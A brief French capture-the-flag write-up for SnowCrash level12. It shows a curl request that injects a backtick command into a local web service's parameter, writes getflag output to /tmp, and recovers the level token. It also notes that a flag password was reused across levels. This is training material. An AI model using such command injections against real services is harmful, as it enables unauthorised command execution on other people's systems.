# SnowCrash - level12 - preuve simple

## Exploitation rapide

Injection de commande via le service web en redirigeant la sortie de getflag vers un fichier temporaire.

Requête envoyée :

```
curl "localhost:4646?x=%60getflag%3E%2Ftmp%2Fa%60"
```

Lecture du résultat :

```
cat /tmp/a
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Résultat

- Token getflag - > fa6v5ateaw21peobuub8ipe6s

## Fun fact

- Le mot de passe de flag10 fonctionne encore pour su flag11, alors que ce comportement n’est normalement pas attendu

## Notes

- La redirection de sortie permet de récupérer le token même sans retour HTTP direct
- Les injections simples avec backticks restent efficaces quand l’entrée utilisateur est passée à un shell
